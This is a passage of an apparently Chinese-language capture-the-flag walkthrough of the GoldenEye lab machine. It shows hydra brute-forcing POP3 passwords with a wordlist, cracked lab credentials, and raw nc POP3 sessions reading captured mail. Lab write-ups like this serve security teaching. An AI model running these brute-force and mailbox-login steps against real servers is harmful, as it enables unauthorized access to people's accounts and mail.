data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'natalya\\nboris'</span> <span class=\"token operator\">></span> users.txt</pre></td></tr></table></figure><p>然后用九头蛇爆破 pop3，密码字典用 kali 自带的</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-L</span> users.txt <span class=\"token parameter variable\">-P</span> /usr/share/wordlists/fasttrack.txt <span class=\"token number\">192.168</span>.222.130 <span class=\"token parameter variable\">-s</span> <span class=\"token number\">55007</span> pop3  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">55007</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>pop3<span class=\"token punctuation\">]</span> host: <span class=\"token number\">192.168</span>.222.130   login: natalya   password: bird </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">55007</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>pop3<span class=\"token punctuation\">]</span> host: <span class=\"token number\">192.168</span>.222.130   login: boris   password: secret1<span class=\"token operator\">!</span></pre></td></tr></table></figure><p>成功爆破出密码</p>\n<p><code>login: natalya   password: bird</code></p>\n<p><code>login: boris   password: secret1!</code></p>\n<p>尝试使用 nc 登录邮箱： <code>nc 192.168.222.130 55007</code></p>\n<p>先登录 boris 邮箱  <code>user boris</code>   <code>pass secret1!</code></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token number\">192.168</span>.222.130 <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK GoldenEye POP3 Electronic-Mail System</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>user boris</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+OK</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pass secret1<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+OK Logged in.</pre></td></tr></table></figure><p>输入 <code>list</code>  查看邮件列表</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>list</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK <span class=\"token number\">3</span> messages:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">544</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">2</span> <span class=\"token number\">373</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">3</span> <span class=\"token number\">921</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><p><code>retr 1</code>  阅读第一封邮件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>retr <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK <span class=\"token number\">544</span> octets</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>root@127.0.0.1.goldeneye<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>X-Original-To: boris</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Delivered-To: boris@ubuntu</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Received: from ok <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with SMTP <span class=\"token function\">id</span> D9E47454B1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>boris<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Tue, <span class=\"token number\">2</span> Apr <span class=\"token number\">1990</span> <span class=\"token number\">19</span>:22:14 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425022326</span>.D9E47454B1@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Date: Tue, <span class=\"token number\">2</span> Apr <span class=\"token number\">1990</span> <span class=\"token number\">19</span>:22:14 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>From: root@127.0.0.1.goldeneye</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails or security risks because I trust you and the other admins here.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Boris，我是管理员。您可以在这里与同事和学生进行电子交流。我不会扫描电子邮件或安全风险，因为我信任您和这里的其他管理员。</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>来自：root@127.0.0.1.goldeneye</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><p><code>retr 2</code>  阅读第二封邮件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>retr <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK <span class=\"token number\">373</span> octets</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>natalya@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>X-Original-To: boris</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Delivered-To: boris@ubuntu</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Received: from ok <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with ESMTP <span class=\"token function\">id</span> C3F2B454B1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>boris<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Tue, <span class=\"token number\">21</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:42:35 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425024249</span>.C3F2B454B1@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Date: Tue, <span class=\"token number\">21</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:42:35 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>From: natalya@ubuntu</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Boris, I can <span class=\"token builtin class-name\">break</span> your codes<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Boris,我能破解你的密码！</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>来自：natalya@ubuntu</pre></td></tr></table></figure><p><code>retr 3</code>  阅读第三封邮件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>retr <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK <span class=\"token number\">921</span> octets</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>alec@janus.boss<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>X-Original-To: boris</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Delivered-To: boris@ubuntu</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Received: from janus <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with ESMTP <span class=\"token function\">id</span> 4B9F4454B1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>boris<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Wed, <span class=\"token number\">22</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:51:48 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425025235</span>.4B9F4454B1@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Date: Wed, <span class=\"token number\">22</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:51:48 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>From: alec@janus.boss</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Boris,</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Your cooperation with our syndicate will pay off big. Attached are the final access codes <span class=\"token keyword\">for</span> GoldenEye. Place them <span class=\"token keyword\">in</span>  hidden <span class=\"token function\">file</span> within the root directory of this server <span class=\"token keyword\">then</span> remove from this email. There can only be one <span class=\"token builtin class-name\">set</span> of these aces codes, and we need to secure them <span class=\"token keyword\">for</span> the final execution. If they are retrieved and captured our plan will crash ad burn<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our inal stages<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>PS - Keep security tight or we will be compromised.</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Boris，</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>您与我们集团的合作将会带来丰厚的回报。 随附的是 GoldenEye 的最终访问代码。 将它们放入该服务器root目录中的隐藏文件中，然后从该电子邮件中删除。 这些 ace 代码只能有一组，我们需要保护它们以便最终执行。 如果它们被找回并捕获，我们的计划就会崩溃！</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>一旦 Xenia 进入培训站点并熟悉 GoldenEye 终端代码，我们将进入最后阶段<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>PS - 保持严格的安全措施，否则我们将受到损害。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>来自：alec@janus.boss</pre></td></tr></table></figure><p>关键信息：</p>\n<p>flag 在服务器 root 目录的隐藏文件中</p>\n<p>Natalya 能破解 Boris 的密码</p>\n<p>登录 Natalya 的邮箱</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token number\">192.168</span>.222.130 <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK GoldenEye POP3 Electronic-Mail System</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>user natalya</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+OK</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pass bird</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+OK Logged in.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>list</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>+OK <span class=\"token number\">2</span> messages:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">631</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">2</span> <span class=\"token number\">1048</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>retr <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>+OK <span class=\"token number\">631</span> octets</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>root@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>X-Original-To: natalya</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Delivered-To: natalya@ubuntu</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Received: from ok <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with ESMTP <span class=\"token function\">id</span> D5EDA454B1</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>natalya<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Tue, <span class=\"token number\">10</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:45:33 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425024542</span>.D5EDA454B1@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Date: Tue, <span class=\"token number\">10</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:45:33 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>From: root@ubuntu</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Natalya, please you need to stop breaking boris<span class=\"token string\">' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>.</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Natalya，请你停止破解Boris的密码。 此外，您还是 GNO 培训主管。 一旦为您指定了学生，我会向您发送电子邮件。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>另外，请警惕可能的网络入侵。 我们得到情报称，黄金眼正在受到一个名叫Janus的犯罪集团的追捕。</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>来自：root@ubuntu</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>retr 2</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>+OK 1048 octets</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>Return-Path: &lt;root@ubuntu></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>X-Original-To: natalya</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>Delivered-To: natalya@ubuntu</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>Received: from root (localhost [127.0.0.1])</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        by ubuntu (Postfix) with SMTP id 17C96454B1</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        for &lt;natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>Message-Id: &lt;20180425031956.17C96454B1@ubuntu></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>From: root@ubuntu</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it'</span>s related to security<span class=\"token punctuation\">..</span>.even <span class=\"token keyword\">if</span> it<span class=\"token string\">'s not, just enter it in under the guise of \"security\"...it'</span>ll get the change order escalated without much hassle <span class=\"token builtin class-name\">:</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>Ok, user creds are:</pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>username: xenia</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>password: RCP90rulez<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>Boris verified her as a valid contractor so just create the account ok?</pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>And <span class=\"token keyword\">if</span> you didn<span class=\"token string\">'t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>**Make sure to edit your host file since you usually work remote off-network....</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>Since you'</span>re a Linux user just point this servers IP to severnaya-station.com <span class=\"token keyword\">in</span> /etc/hosts.</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>好的，Natalyn，我给你带来了一个新学生。 由于这是一个新系统，如果您发现任何配置问题，请告诉我或Boris，特别是它是否与安全相关<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>即使不是，只需以“安全”为幌子输入<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>它就会 轻松升级变更单:<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>好的，用户凭证是：</pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>用户名：xenia</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>密码：RCP90rulez<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>Boris验证了她是有效的承包商，所以只需创建帐户即可，好吗？</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>如果您没有外部内部域上的 URL：severnaya-station.com/gnocertdir</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>**请确保编辑您的主机文件，因为您通常在离线状态下远程工作<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>由于您是 Linux 用户，只需将此服务器 IP 指向 /etc/hosts 中的 severnaya-station.com 即可。</pre></td></tr></table></figure><p>关键信息：</p>\n<p>URL： <code>severnaya-station.com/gnocertdir</code></p>\n<p>将此服务器 IP 指向 <code> /etc/hosts</code>  中的  <code>severnaya-station.com</code></p>\n<p>用户名： <code>xenia</code> <br />\n 密码： <code>RCP90rulez!</code></p>\n<p>配置 <code> /etc/hosts</code>  ，<a href=\"http://xn--severnaya-station-mk81aj497f.com/gnocertdir%E7%BD%91%E7%AB%99%E7%99%BB%E5%BD%95xenia%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9D%A5%E8%87%AADr_Doak%E7%9A%84%E6%B6%88%E6%81%AF\">进入 severnaya-station.com/gnocertdir 网站登录 xenia，发现来自 Dr_Doak 的消息</a></p>\n<p>Page path：</p>\n<pre><code>Home / ► My profile / ► Messages\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514105928843.png\" alt=\"image-20240514105928843\" /></p>\n<p>关键信息：</p>\n<p>My email username is...doak</p>\n<p>又得到一个邮箱的用户名，直接拿九头蛇爆破他</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> doak <span class=\"token parameter variable\">-P</span> /usr/share/wordlists/fasttrack.txt <span class=\"token number\">192.168</span>.222.130 <span class=\"token parameter variable\">-s</span> <span class=\"token number\">55007</span> pop3</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">55007</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>pop3<span class=\"token punctuation\">]</span> host: <span class=\"token number\">192.168</span>.222.130   login: doak   password: goat</pre></td></tr></table></figure><p>登录 doak 邮箱查看邮件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token number\">192.168</span>.222.130 <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK GoldenEye POP3 Electronic-Mail System</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>user doak</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+OK</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pass goat      </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+OK Logged in.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>list</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>+OK <span class=\"token number\">1</span> messages:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">606</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>retr <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>+OK <span class=\"token number\">606</span> octets</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>doak@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>X-Original-To: doak</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Delivered-To: doak@ubuntu</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Received: from doak <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with SMTP <span class=\"token function\">id</span> 97DC24549D</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>doak<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Tue, <span class=\"token number\">30</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">20</span>:47:24 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425034731</span>.97DC24549D@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Date: Tue, <span class=\"token number\">30</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">20</span>:47:24 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>From: doak@ubuntu</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>James,</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>If you<span class=\"token string\">'re reading this, congrats you'</span>ve gotten this far. You know how tradecraft works right?</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Because I don't. Go to our training site and login to my account<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>dig <span class=\"token keyword\">until</span> you can exfiltrate further information<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>username: dr_doak</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>password: 4England<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>James,</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>如果您正在阅读本文，那么恭喜您已经走到这一步了。你知道谍报技术是如何运作的吧？</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>因为我不知道。转到我们的培训网站并登录我的帐户<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>挖掘，直到你能获得进一步的信息<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>用户名：dr_doak</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>密码：4England<span class=\"token operator\">!</span></pre></td></tr></table></figure><p>得到 doak 的培训账号，这个 James 是谁，难道是我？</p>\n<p>用户名：dr_doak<br />\n 密码：4England!</p>\n<p>进入培训网站登录 doak 博士的账号</p>\n<p>发现一个新用户，是管理员。</p>\n<p>Page path：</p>\n<pre><code>Home / ► My profile / ► Messages\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514112817572.png\" alt=\"image-20240514112817572\" /></p>\n<p>发现给 James 的文件：s3cret.txt</p>\n<p>Page path：</p>\n<pre><code>Home / ► My home\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514113203301.png\" alt=\"image-20240514113203301\" /></p>\n<p>下载下来看看：</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>007,</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>I was able to capture this apps adm1n cr3ds through clear txt. </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Something juicy is located here: /dir007key/for-007.jpg</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Also as you may know, the RCP-90 is vastly superior to any other weapon 